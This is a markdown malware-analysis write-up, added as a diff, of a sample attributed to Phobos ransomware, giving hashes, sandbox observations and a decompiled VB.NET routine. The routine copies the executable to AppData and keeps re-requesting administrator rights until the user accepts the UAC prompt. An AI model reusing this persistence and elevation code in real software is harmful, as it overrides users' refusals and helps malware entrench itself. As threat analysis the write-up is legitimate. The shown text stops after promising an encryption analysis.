@@ -1,0 +1,95 @@
+# Phobos Ransomware family
+
+* https://app.any.run/tasks/d6da4173-2f9d-4b2f-8a20-b0a86dddd510
+
+
+**File Informations**
+
+| Attribut | Détail |
+|----------|--------|
+| Type de fichier | PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows |
+| MD5 | 761E82385AC656CDB40C5B9189AB0CF2 |
+| SHA1 | F5E22AEDB5435AF95D2E76ABD348661909526437 |
+| SHA256 | B902F48739FA84BE97815B796681A7B337C7BBCAD14D436AEB6BA93B9FE5AEBD |
+| SSDEEP | 6144:pdr9vlTixqewT/IDI32oQqDVJ2r1lXohOBkWTXd7umpq:HmxIIM2ojJ2r1lYhOBkWTphpq |
+| Creation Time   | 2023-11-23 01:59:44 UTC|
+
+**Analyse information from ANY.RUN**
+
+Firstly, the ransomware.exe process (PID 2980) self-restarts using svchost.exe, enabling it to gain privileged rights and re-register under PID 2848.
+![image](/images/phobos/phobos-02.png)
+
+![image](/images/phobos/phobos-03.png)
+
+Here's how the VB.NET code appears. It copy the current executable to a specified location and attempt to run it with administrative privileges. 
+
+```
+Private Shared Sub copyResistForAdmin(processName As String)
+	Dim friendlyName As String = AppDomain.CurrentDomain.FriendlyName
+	Dim location As String = Assembly.GetExecutingAssembly().Location
+	Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\" + friendlyName
+	Dim text As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\"
+	Dim text2 As String = text + processName
+	Dim processStartInfo As ProcessStartInfo = New ProcessStartInfo(text2) With { .UseShellExecute = True, .Verb = "runas", .WindowStyle = ProcessWindowStyle.Normal, .WorkingDirectory = text }
+	Dim process As Process = New Process()
+	process.StartInfo = processStartInfo
+	If friendlyName <> processName OrElse location <> text2 Then
+		If Not File.Exists(text2) Then
+			File.Copy(friendlyName, text2)
+			Try
+				Process.Start(processStartInfo)
+				Environment.[Exit](1)
+				Return
+			Catch ex As Win32Exception
+				If ex.NativeErrorCode = 1223 Then
+					Program.copyResistForAdmin(processName)
+				End If
+				Return
+			End Try
+		End If
+		Try
+			File.Delete(text2)
+			Thread.Sleep(200)
+			File.Copy(friendlyName, text2)
+		Catch
+		End Try
+		Try
+			Process.Start(processStartInfo)
+			Environment.[Exit](1)
+		Catch ex2 As Win32Exception
+			If ex2.NativeErrorCode = 1223 Then
+				Program.copyResistForAdmin(processName)
+			End If
+		End Try
+	End If
+End Sub
+```
+1.  ***Getting Basic Information:***
+    
+    -   Retrieves the name of the current executable (`friendlyName`).
+    -   Gets the location of the currently executing assembly (`location`).
+    -   Defines paths in the Startup folder and Application Data folder.
+2.  ***Preparing to Copy and Execute:***
+    
+    -   Constructs the path for the new executable in the Application Data folder (`text2`).
+    -   Sets up a `ProcessStartInfo` object to run the new executable. This includes running it with administrative privileges (`runas`).
+3.  ***Copying and Executing:***
+    
+    -   Checks if the current executable is different from the target executable. If so, it proceeds.
+    -   If the target executable (`text2`) doesn't exist, it copies the current executable there and tries to start it. If it fails due to a specific Windows exception (error code 1223, typically indicating the user declined the UAC prompt), it recursively calls itself.
+    -   Tries to delete the existing target executable, waits briefly, and copies the current executable again. If this fails, the catch block ignores the error.
+    -   Attempts to start the process again and exits the current environment if successful.
+4.  ***Error Handling:***
+    
+    -   Includes handling for `Win32Exception`, particularly for error code 1223, suggesting UAC denial. In this case, the function calls itself recursively.
+
+The software appears to impact a significant number of files by either creating, modifying, or renaming them.
+
+![information](/images/phobos/phobos-04.png)
+
+The two screenshots depict a file being renamed, while its content remains encrypted. We will examine the source code to understand how this process is carried out.
+
+![information](/images/phobos/phobos-05.png)
+
+![information](/images/phobos/phobos-06.png)
+
